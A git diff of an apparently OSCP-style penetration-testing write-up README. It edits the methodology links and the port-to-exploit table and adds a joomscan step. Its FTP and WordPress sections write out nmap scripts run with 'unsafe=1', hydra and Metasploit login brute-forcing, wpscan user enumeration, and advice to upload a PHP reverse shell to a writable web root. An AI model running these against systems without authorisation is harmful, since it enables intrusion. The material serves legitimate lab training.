@@ -40,9 +40,9 @@
 ### ⚙️ Phase #0: Recon [🡑](#methodology)
 **Goal**: to scan all ports on &lt;targetip&gt;  
 **Process**:
-* [enumerate_nmap_initial](https://github.com/7h3rAm/writeupsall/blob/master/readme.md#enumerate_nmap_initial)
-* [enumerate_nmap_tcp](https://github.com/7h3rAm/writeupsall/blob/master/readme.md#enumerate_nmap_tcp)
-* [enumerate_nmap_udp](https://github.com/7h3rAm/writeupsall/blob/master/readme.md#enumerate_nmap_udp)
+* [enumerate_nmap_initial](#enumerate_nmap_initial)
+* [enumerate_nmap_tcp](#enumerate_nmap_tcp)
+* [enumerate_nmap_udp](#enumerate_nmap_udp)
 
 <a name="menumerate"></a>
 ### ⚙️ Phase #1: Enumerate [🡑](#methodology)
@@ -66,8 +66,8 @@
 **Goal**: gain elevated privileges on &lt;targetip&gt;  
 **Process**:
 * debug available exploits or misconfigurations
-* for nix, use linux smart enum (lse) - https://github.com/diego-treitos/linux-smart-enumeration
-* for windows, use winpeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+* for nix, use [linux smart enum](https://github.com/diego-treitos/linux-smart-enumeration)
+* for windows, use [winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
 
 
 <a name="stats"></a>
@@ -115,13 +115,13 @@
 | 4. | `25/tcp` |  | [`enumerate_proto_smtp`](https://github.com/7h3rAm/writeups#enumerate_proto_smtp) |  |
 | 5. | `53/tcp` |  | [`enumerate_proto_dns`](https://github.com/7h3rAm/writeups#enumerate_proto_dns) |  |
 | 6. | `79/tcp` |  | [`enumerate_proto_finger`](https://github.com/7h3rAm/writeups#enumerate_proto_finger) |  |
-| 7. | `80/tcp` | `http/2.4.18 ((Ubuntu))`<br /><br />`http/Apache httpd`<br /><br />`http/Apache httpd 2.0.52 ((CentOS))`<br /><br />`http/Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)`<br /><br />`http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)`<br /><br />`http/Apache httpd 2.2.22 ((Ubuntu))`<br /><br />`http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)`<br /><br />`http/Apache httpd 2.4.18 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.25 ((Debian))`<br /><br />`http/Apache httpd 2.4.29 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.34 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.41 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.7 ((Ubuntu))`<br /><br />`http/HttpFileServer httpd 2.3`<br /><br />`http/Microsoft IIS httpd 6.0`<br /><br />`http/Microsoft IIS httpd 7.5` | [`enumerate_app_apache`](https://github.com/7h3rAm/writeups#enumerate_app_apache), [`enumerate_app_apache_tomcat`](https://github.com/7h3rAm/writeups#enumerate_app_apache_tomcat), [`enumerate_app_coldfusion_files`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_files), [`enumerate_app_coldfusion_version`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_version), [`enumerate_app_drupal`](https://github.com/7h3rAm/writeups#enumerate_app_drupal), [`enumerate_app_phpmyadmin`](https://github.com/7h3rAm/writeups#enumerate_app_phpmyadmin), [`enumerate_app_prtg`](https://github.com/7h3rAm/writeups#enumerate_app_prtg), [`enumerate_app_webmin`](https://github.com/7h3rAm/writeups#enumerate_app_webmin), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_proto_webdav`](https://github.com/7h3rAm/writeups#enumerate_proto_webdav) | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_hfs_cmd_exec`](https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell), [`privesc_bof`](https://github.com/7h3rAm/writeups#privesc_bof), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046), [`privesc_windows_ms14_070`](https://github.com/7h3rAm/writeups#privesc_windows_ms14_070), [`privesc_windows_ms15_051`](https://github.com/7h3rAm/writeups#privesc_windows_ms15_051), [`privesc_windows_ms16_098`](https://github.com/7h3rAm/writeups#privesc_windows_ms16_098) |
+| 7. | `80/tcp` | `http/2.4.18 ((Ubuntu))`<br /><br />`http/Apache httpd`<br /><br />`http/Apache httpd 2.0.52 ((CentOS))`<br /><br />`http/Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)`<br /><br />`http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)`<br /><br />`http/Apache httpd 2.2.22 ((Ubuntu))`<br /><br />`http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)`<br /><br />`http/Apache httpd 2.4.18 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.25 ((Debian))`<br /><br />`http/Apache httpd 2.4.29 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.34 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.41 ((Ubuntu))`<br /><br />`http/Apache httpd 2.4.7 ((Ubuntu))`<br /><br />`http/HttpFileServer httpd 2.3`<br /><br />`http/Microsoft IIS httpd 6.0`<br /><br />`http/Microsoft IIS httpd 7.5` | [`enumerate_app_apache`](https://github.com/7h3rAm/writeups#enumerate_app_apache), [`enumerate_app_apache_tomcat`](https://github.com/7h3rAm/writeups#enumerate_app_apache_tomcat), [`enumerate_app_coldfusion_files`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_files), [`enumerate_app_coldfusion_version`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_version), [`enumerate_app_drupal`](https://github.com/7h3rAm/writeups#enumerate_app_drupal), [`enumerate_app_joomla`](https://github.com/7h3rAm/writeups#enumerate_app_joomla), [`enumerate_app_phpmyadmin`](https://github.com/7h3rAm/writeups#enumerate_app_phpmyadmin), [`enumerate_app_prtg`](https://github.com/7h3rAm/writeups#enumerate_app_prtg), [`enumerate_app_webmin`](https://github.com/7h3rAm/writeups#enumerate_app_webmin), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_proto_webdav`](https://github.com/7h3rAm/writeups#enumerate_proto_webdav) | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_cmdexec`](https://github.com/7h3rAm/writeups#exploit_cmdexec), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_hfs_cmd_exec`](https://github.com/7h3rAm/writeups#exploit_hfs_cmd_exec), [`exploit_iis_asp_reverseshell`](https://github.com/7h3rAm/writeups#exploit_iis_asp_reverseshell), [`exploit_iis_webdav`](https://github.com/7h3rAm/writeups#exploit_iis_webdav), [`exploit_lotuscms`](https://github.com/7h3rAm/writeups#exploit_lotuscms), [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`exploit_ssh_privatekeys`](https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin), [`exploit_wordpress_plugin_activitymonitor`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_activitymonitor), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell), [`privesc_bof`](https://github.com/7h3rAm/writeups#privesc_bof), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs), [`privesc_kernel_ipappend`](https://github.com/7h3rAm/writeups#privesc_kernel_ipappend), [`privesc_lxc_bash`](https://github.com/7h3rAm/writeups#privesc_lxc_bash), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_shell_escape`](https://github.com/7h3rAm/writeups#privesc_shell_escape), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_windows_ms11_046`](https://github.com/7h3rAm/writeups#privesc_windows_ms11_046), [`privesc_windows_ms14_070`](https://github.com/7h3rAm/writeups#privesc_windows_ms14_070), [`privesc_windows_ms15_051`](https://github.com/7h3rAm/writeups#privesc_windows_ms15_051), [`privesc_windows_ms16_098`](https://github.com/7h3rAm/writeups#privesc_windows_ms16_098) |
 | 8. | `111/tcp` |  | [`enumerate_proto_nfs`](https://github.com/7h3rAm/writeups#enumerate_proto_nfs), [`enumerate_proto_rpc`](https://github.com/7h3rAm/writeups#enumerate_proto_rpc) |  |
 | 9. | `135/tcp` |  | [`enumerate_proto_rpc`](https://github.com/7h3rAm/writeups#enumerate_proto_rpc) |  |
 | 10. | `139/tcp` | `netbios-ssn/Microsoft Windows netbios-ssn`<br /><br />`netbios-ssn/Samba smbd 3.X - 4.X (workgroup: WORKGROUP)` | [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`exploit_smb_ms08_067`](https://github.com/7h3rAm/writeups#exploit_smb_ms08_067), [`exploit_smb_ms17_010`](https://github.com/7h3rAm/writeups#exploit_smb_ms17_010) | [`exploit_smb_ms08_067`](https://github.com/7h3rAm/writeups#exploit_smb_ms08_067), [`exploit_smb_ms17_010`](https://github.com/7h3rAm/writeups#exploit_smb_ms17_010), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_usermap`](https://github.com/7h3rAm/writeups#exploit_smb_usermap), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root) |
 | 11. | `161/tcp` |  | [`enumerate_proto_snmp`](https://github.com/7h3rAm/writeups#enumerate_proto_snmp) |  |
 | 12. | `389/tcp` |  | [`enumerate_proto_ldap`](https://github.com/7h3rAm/writeups#enumerate_proto_ldap) |  |
-| 13. | `443/tcp` | `ssl/https/Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b` | [`enumerate_app_apache`](https://github.com/7h3rAm/writeups#enumerate_app_apache), [`enumerate_app_apache_tomcat`](https://github.com/7h3rAm/writeups#enumerate_app_apache_tomcat), [`enumerate_app_coldfusion_files`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_files), [`enumerate_app_coldfusion_version`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_version), [`enumerate_app_drupal`](https://github.com/7h3rAm/writeups#enumerate_app_drupal), [`enumerate_app_phpmyadmin`](https://github.com/7h3rAm/writeups#enumerate_app_phpmyadmin), [`enumerate_app_prtg`](https://github.com/7h3rAm/writeups#enumerate_app_prtg), [`enumerate_app_webmin`](https://github.com/7h3rAm/writeups#enumerate_app_webmin), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_proto_webdav`](https://github.com/7h3rAm/writeups#enumerate_proto_webdav) | [`exploit_modssl`](https://github.com/7h3rAm/writeups#exploit_modssl), [`privesc_modssl`](https://github.com/7h3rAm/writeups#privesc_modssl) |
+| 13. | `443/tcp` | `ssl/https/Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b` | [`enumerate_app_apache`](https://github.com/7h3rAm/writeups#enumerate_app_apache), [`enumerate_app_apache_tomcat`](https://github.com/7h3rAm/writeups#enumerate_app_apache_tomcat), [`enumerate_app_coldfusion_files`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_files), [`enumerate_app_coldfusion_version`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_version), [`enumerate_app_drupal`](https://github.com/7h3rAm/writeups#enumerate_app_drupal), [`enumerate_app_joomla`](https://github.com/7h3rAm/writeups#enumerate_app_joomla), [`enumerate_app_phpmyadmin`](https://github.com/7h3rAm/writeups#enumerate_app_phpmyadmin), [`enumerate_app_prtg`](https://github.com/7h3rAm/writeups#enumerate_app_prtg), [`enumerate_app_webmin`](https://github.com/7h3rAm/writeups#enumerate_app_webmin), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_proto_webdav`](https://github.com/7h3rAm/writeups#enumerate_proto_webdav) | [`exploit_modssl`](https://github.com/7h3rAm/writeups#exploit_modssl), [`privesc_modssl`](https://github.com/7h3rAm/writeups#privesc_modssl) |
 | 14. | `445/tcp` | `microsoft-ds/Windows Server 2019 Standard 17763 microsoft-ds` | [`enumerate_app_powershell_history`](https://github.com/7h3rAm/writeups#enumerate_app_powershell_history), [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`exploit_smb_ms08_067`](https://github.com/7h3rAm/writeups#exploit_smb_ms08_067), [`exploit_smb_ms17_010`](https://github.com/7h3rAm/writeups#exploit_smb_ms17_010) | [`enumerate_proto_smb`](https://github.com/7h3rAm/writeups#enumerate_proto_smb), [`enumerate_proto_smb_anonymous_access`](https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access), [`privesc_psexec_login`](https://github.com/7h3rAm/writeups#privesc_psexec_login) |
 | 15. | `636/tcp` |  | [`enumerate_proto_ldap`](https://github.com/7h3rAm/writeups#enumerate_proto_ldap) |  |
 | 16. | `1337/tcp` | `http/Apache httpd 2.4.7 ((Ubuntu))` |  | [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_sqli`](https://github.com/7h3rAm/writeups#exploit_sqli), [`privesc_kernel_overlayfs`](https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs), [`privesc_mysql_root`](https://github.com/7h3rAm/writeups#privesc_mysql_root), [`privesc_mysql_udf`](https://github.com/7h3rAm/writeups#privesc_mysql_udf) |
@@ -132,23 +132,22 @@
 | 21. | `3000/tcp` | `http/Node.js Express framework` |  | [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_mongodb`](https://github.com/7h3rAm/writeups#exploit_mongodb), [`exploit_nodejs`](https://github.com/7h3rAm/writeups#exploit_nodejs), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
 | 22. | `3232/tcp` |  | [`enumerate_proto_distcc`](https://github.com/7h3rAm/writeups#enumerate_proto_distcc) |  |
 | 23. | `3306/tcp` |  | [`enumerate_proto_mysql`](https://github.com/7h3rAm/writeups#enumerate_proto_mysql) |  |
-| 24. | `3389/tcp` |  | [`enumerate_proto_rdp`](https://github.com/7h3rAm/writeups#enumerate_proto_rdp) |  |
-| 25. | `6660/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 26. | `6661/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 27. | `6662/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 28. | `6663/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 29. | `6664/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 30. | `6665/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 31. | `6666/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 32. | `6667/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 33. | `6668/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 34. | `6669/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 35. | `7000/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
-| 36. | `8080/tcp` | `http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)`<br /><br />`http/Apache httpd 2.4.29 ((Ubuntu))` | [`enumerate_app_apache`](https://github.com/7h3rAm/writeups#enumerate_app_apache), [`enumerate_app_apache_tomcat`](https://github.com/7h3rAm/writeups#enumerate_app_apache_tomcat), [`enumerate_app_coldfusion_files`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_files), [`enumerate_app_coldfusion_version`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_version), [`enumerate_app_drupal`](https://github.com/7h3rAm/writeups#enumerate_app_drupal), [`enumerate_app_phpmyadmin`](https://github.com/7h3rAm/writeups#enumerate_app_phpmyadmin), [`enumerate_app_prtg`](https://github.com/7h3rAm/writeups#enumerate_app_prtg), [`enumerate_app_webmin`](https://github.com/7h3rAm/writeups#enumerate_app_webmin), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_proto_webdav`](https://github.com/7h3rAm/writeups#enumerate_proto_webdav) | [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_phptax`](https://github.com/7h3rAm/writeups#exploit_phptax), [`privesc_freebsd`](https://github.com/7h3rAm/writeups#privesc_freebsd), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
-| 37. | `9999/tcp` | `abyss?` |  | [`privesc_anansi`](https://github.com/7h3rAm/writeups#privesc_anansi), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
-| 38. | `10000/tcp` | `http/SimpleHTTPServer 0.6 (Python 2.7.3)` |  | [`exploit_bof`](https://github.com/7h3rAm/writeups#exploit_bof) |
-| 39. | `27017/tcp` |  | [`enumerate_app_mongo`](https://github.com/7h3rAm/writeups#enumerate_app_mongo) |  |
-| 40. | `28017/tcp` |  | [`enumerate_app_mongo`](https://github.com/7h3rAm/writeups#enumerate_app_mongo) |  |
+| 24. | `6660/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 25. | `6661/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 26. | `6662/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 27. | `6663/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 28. | `6664/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 29. | `6665/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 30. | `6666/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 31. | `6667/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 32. | `6668/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 33. | `6669/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 34. | `7000/tcp` |  | [`enumerate_app_unrealirc`](https://github.com/7h3rAm/writeups#enumerate_app_unrealirc) |  |
+| 35. | `8080/tcp` | `http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)`<br /><br />`http/Apache httpd 2.4.29 ((Ubuntu))` | [`enumerate_app_apache`](https://github.com/7h3rAm/writeups#enumerate_app_apache), [`enumerate_app_apache_tomcat`](https://github.com/7h3rAm/writeups#enumerate_app_apache_tomcat), [`enumerate_app_coldfusion_files`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_files), [`enumerate_app_coldfusion_version`](https://github.com/7h3rAm/writeups#enumerate_app_coldfusion_version), [`enumerate_app_drupal`](https://github.com/7h3rAm/writeups#enumerate_app_drupal), [`enumerate_app_joomla`](https://github.com/7h3rAm/writeups#enumerate_app_joomla), [`enumerate_app_phpmyadmin`](https://github.com/7h3rAm/writeups#enumerate_app_phpmyadmin), [`enumerate_app_prtg`](https://github.com/7h3rAm/writeups#enumerate_app_prtg), [`enumerate_app_webmin`](https://github.com/7h3rAm/writeups#enumerate_app_webmin), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_proto_rdp`](https://github.com/7h3rAm/writeups#enumerate_proto_rdp), [`enumerate_proto_webdav`](https://github.com/7h3rAm/writeups#enumerate_proto_webdav) | [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_phptax`](https://github.com/7h3rAm/writeups#exploit_phptax), [`privesc_freebsd`](https://github.com/7h3rAm/writeups#privesc_freebsd), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
+| 36. | `9999/tcp` | `abyss?` |  | [`privesc_anansi`](https://github.com/7h3rAm/writeups#privesc_anansi), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
+| 37. | `10000/tcp` | `http/SimpleHTTPServer 0.6 (Python 2.7.3)` |  | [`exploit_bof`](https://github.com/7h3rAm/writeups#exploit_bof) |
+| 38. | `27017/tcp` |  | [`enumerate_app_mongo`](https://github.com/7h3rAm/writeups#enumerate_app_mongo) |  |
+| 39. | `28017/tcp` |  | [`enumerate_app_mongo`](https://github.com/7h3rAm/writeups#enumerate_app_mongo) |  |
 
 
 <a name="machines"></a>
@@ -259,6 +258,17 @@ scan:
 
 ```
   
+[+] https://zayotic.com/posts/oscp-reference/  
+  
+---
+<a name="enumerate_app_joomla"></a>
+#### enumerate_app_joomla [⇡](#enumerate)  
+```shell
+joomscan --url http://<targetip>
+
+```
+  
+[+] https://zayotic.com/posts/oscp-reference/  
   
 ---
 <a name="enumerate_app_mongo"></a>
@@ -371,8 +381,8 @@ default creds: admin/password
 look for phpmyadmin, plugins directories
 look for wp-config.php file (via an open smb/ftp share) => contains db creds, useful for phpmyadmin and ssh
 enumerate authors:
-  http://192.168.92.167:8080/?author=1 => will show username as "AUTHOR ARCHIVES: <username>"
-  http://192.168.92.167:8080/?author=2 => will not show username if author id is invalid
+  http://192.168.92.167:<targetport>/?author=1 => will show username as "AUTHOR ARCHIVES: <username>"
+  http://192.168.92.167:<targetport>/?author=2 => will not show username if author id is invalid
   wpuser http://192.168.92.134/ usernames
 wpscan --url http://192.168.92.134:80/ -e vp,vt,tt,cb,dbe,u,m
 bruteforce wordpress login:
@@ -535,24 +545,16 @@ finger username@<targetip>
 ---
 <a name="enumerate_proto_ftp"></a>
 #### enumerate_proto_ftp [⇡](#enumerate)  
+check if version is vulnerable and exploit is available. check if anonymous access is enabled. check if read permission for sensitive files. check if write permission within webroot/uploads or other critical directories. check if ftp root directory is also http root directory and upload php reverse shell. remember - binary and ascii transfer mode switch  
 ```shell
-high level process:
-  Version number and associated CVEs
-  Anonymous / authenticated login (with discovered creds)
-  Sensitive files that you have read access to
-  File upload
-
-nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 <targetip>
-nmap -sV -Pn -vv -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <targetip>
-hydra -s 21 -C /usr/share/sparta/wordlists/ftp-default-userpass.txt -u -f <targetip> ftp
 ftp passive mode:
   ftp -p 192.168.92.192
 bruteforce ftp login:
   use auxiliary/scanner/ftp/ftp_login
-check if version is vulnerable and exploit is available
-check if anonymous access is enabled
-check if write permission within uploads directory
-check if ftp root directory is also http root directory and upload php reverse shell
+misc:
+  nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 <targetip>
+  nmap -sV -Pn -vv -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <targetip>
